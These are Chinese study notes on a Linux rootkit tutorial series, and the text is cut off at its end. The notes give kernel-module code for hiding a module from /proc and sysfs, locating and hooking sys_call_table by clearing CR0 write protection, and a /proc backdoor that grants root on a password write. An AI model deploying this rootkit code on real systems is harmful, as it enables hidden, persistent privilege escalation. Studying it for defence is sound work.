https://brant-ruan.github.io/rootkit/2017/05/08/LinuxRootkitExp-0001.html  这系列的读书笔记

### 系列一

[Linux Rootkit系列一：LKM的基础编写及隐藏 - 腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/1036559)

原帖在freebuf，但是好像看不了

#### lkm基础

首先实现了个最简单的kernel module示例，但这里可能版本不一样，需要进行一些修改，源码需要加上

```c
MODULE_LICENSE("GPL");
```

#### 隐藏LKM

##### proc隐藏

lsmod命令通过 `/proc/modules` 来获取当前系统模块信息，该文件系统通过modules结构体表头遍历（即下面的list成员）

```c
struct module {
    enum module_state state;

    /* Member of list of modules */
    struct list_head list;

    /* Unique handle for this module */
    char name[MODULE_NAME_LEN];

    /* Sysfs stuff. */
    struct module_kobject mkobj;
    struct module_attribute *modinfo_attrs;
    const char *version;
    const char *srcversion;
    struct kobject *holders_dir;

    ...
```

因此要隐藏该内核模块，可以将其从内核的module链表上删除，实现方式很简单，内核模块用变量 `__this_module` 来标记自己对应的module结构体，因此只需要运行

```c
list_del_init(&__this_module.list);
```

即可实现从proc中隐藏模块

或可以使用 `THIS_MODULE` 宏代替 `__this_module`

##### sysfs隐藏

此外查看内核模块还有一种方式：在 `/sys/module` 目录下查看模块

sysfs通过module的mkobj成员（见上面结构体定义）来获取当前模块的信息，该成员的结构体 `struct module_kobject` 定义如下

```c
struct module_kobject {
    struct kobject kobj;
    struct module *mod;
    struct kobject *drivers_dir;
    struct module_param_attrs *mp;
    struct completion *kobj_completion;
} __randomize_layout;
```

其中kobject是组成设备模型的基本结构

要从sysfs隐藏该模块也很简单，删除对应的kobject结构即可

```c
kobject_del(&THIS_MODULE->mkobj.kobj);
```

### 系列二

[Linux Rootkit 系列二：基于修改 sys_call_table 的系统调用挂钩](https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/linux_rootkit/sys_call_table.html)

#### 基于sys_call_table的系统调用钩子

需要下面几步

* 获取sys_call_table地址

* 修改该地址的写保护

* 修改table内容

##### 获取sys_call_table地址

这里提及了几个方法

* 从 `/boot/System.map` 读取，具体方法见 https://tnichols.org/2015/10/19/Hooking-the-Linux-System-Call-Table/

* 从使用了sys_call_table的某些未导出函数的机器码里进行特征搜索，具体见 https://kernelhacking.com/rodrigo/docs/StMichael/kernel-land-rootkits.pdf

* 从内核起始地址开始暴力搜索内存空间，对比该地址是否与自己获取到的syscall地址一致。也是这里作者用的方法（但到5.15版本内核已经没法使用了，原因说实话我也不太知道，在编译时会报找不到sys_close符号的错误，但在syscalls.h头文件里明明有定义（难道是因为没导出？））

* 在[zeroevil](research_rootkit_code.md)中还提供了两种通过kprobe获取符号的方法

爆破法代码如下

```c
unsigned long **
get_sys_call_table(void)
{
  unsigned long **entry = (unsigned long **)PAGE_OFFSET;

  for (;(unsigned long)entry < ULONG_MAX; entry += 1) {
    if (entry[__NR_close] == (unsigned long *)sys_close) {
        return entry;
      }
  }

  return NULL;
}
```

##### 关闭写保护

这里绕过写保护的方法很底层：直接控制 [CR0](https://en.wikipedia.org/wiki/Control_register#CR0) 寄存器，该寄存器的第16位为

| bit | Name | Full Name     | Description                                                                |
| --- | ---- | ------------- | -------------------------------------------------------------------------- |
| 16  | WP   | Write Protect | When set, the CPU can't write to read-only pages when privilege level is 0 |

这里调用 read_cr0 / write_cr0 函数来修改cr0寄存器

```c
void
disable_write_protection(void)
{
  unsigned long cr0 = read_cr0();
  clear_bit(16, &cr0);
  write_cr0(cr0);
}

void
enable_write_protection(void)
{
  unsigned long cr0 = read_cr0();
  set_bit(16, &cr0);
  write_cr0(cr0);
}
```

##### 修改

修改的过程就比较简单了

```c
disable_write_protection();
real_open = (void *)sys_call_table[__NR_open];
sys_call_table[__NR_open] = (unsigned long*)fake_open;
real_unlink = (void *)sys_call_table[__NR_unlink];
sys_call_table[__NR_unlink] = (unsigned long*)fake_unlink;
real_unlinkat = (void *)sys_call_table[__NR_unlinkat];
sys_call_table[__NR_unlinkat] = (unsigned long*)fake_unlinkat;
enable_write_protection();
```

##### 恢复

```c
disable_write_protection();
sys_call_table[__NR_open] = (unsigned long*)real_open;
sys_call_table[__NR_unlink] = (unsigned long*)real_unlink;
sys_call_table[__NR_unlinkat] = (unsigned long*)real_unlinkat;
enable_write_protection();
```

#### 实现初级文件监视

这里的hook就跟用户态hook函数基本类似了，将自己想实现的功能放上去即可。与用户态唯一的不同是使用的库函数只能是内核提供的函数

##### 监控文件创建

```c
asmlinkage long
fake_open(const char __user *filename, int flags, umode_t mode)
{
  if ((flags & O_CREAT) && strcmp(filename, "/dev/null") != 0) {
    printk(KERN_ALERT "open: %s\n", filename);
  }

  return real_open(filename, flags, mode);
}
```

##### 监控文件删除

```c
asmlinkage long
fake_unlink(const char __user *pathname)
{
  printk(KERN_ALERT "unlink: %s\n", pathname);

  return real_unlink(pathname);
}

asmlinkage long
fake_unlinkat(int dfd, const char __user * pathname, int flag)
{
  printk(KERN_ALERT "unlinkat: %s\n", pathname);

  return real_unlinkat(dfd, pathname, flag);
}
```

### 系列三

[Linux Rootkit 系列三：实例详解 Rootkit 必备的基本功能 &mdash; LibreCrops 中文文档项目 0.2.0-git 文档](https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/linux_rootkit/fundamentals.html)

rootkit必备的基本功能实现

#### proc后门

在/proc下创建一个文件，在write函数中实现后门的认证功能。提权方式很简单，先获取当前task的credit（`__task_cred`），再改写对应的uid/euid和gid/egid

首先在创建proc文件时至少需要一个写操作的函数，因为我们的目的是向该文件写入内容来控制后门

```c
ssize_t
write_handler(struct file * filp, const char __user *buff, size_t count, loff_t *offp);

struct file_operations proc_fops = {
    .write = write_handler
};
```

可以使用下列代码创建或删除一个proc文件

```c
struct proc_dir_entry *entry;

entry = proc_create(NAME, S_IRUGO | S_IWUGO, NULL, &proc_fops);     // create

proc_remove(entry);        // delete
```

这里的写操作回调定义如下，该函数实现了一个后门，当往proc对应文件写入密码时就会提权当前用户

过程很简单：

* 分配内存，将用户输入拷贝到内核缓冲区

* 比较输入的内容是否是密码

* 修改当前用户的uid euid fsuid和gid egid fsgid为root用户

```c
ssize_t
write_handler(struct file * filp, const char __user *buff,
              size_t count, loff_t *offp)
{
    char *kbuff;
    struct cred* cred;

    kbuff = kmalloc(count, GFP_KERNEL);
    if (!kbuff) {
        return -ENOMEM;
    }

    if (copy_from_user(kbuff, buff, count)) {
        kfree(kbuff);
        return -EFAULT;
    }
    kbuff[count] = (char)0;

    if (strlen(kbuff) == strlen(AUTH) &&
        strncmp(AUTH, kbuff, count) == 0) {
        fm_alert("%s\n", "Comrade, I will help you.");
        cred = (struct cred *)__task_cred(current);
        cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
        cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
        fm_alert("%s\n", "See you!");
    } else {
        fm_alert("Alien, get out of here: %s.\n", kbuff);
```

#### 控制内核模块加载
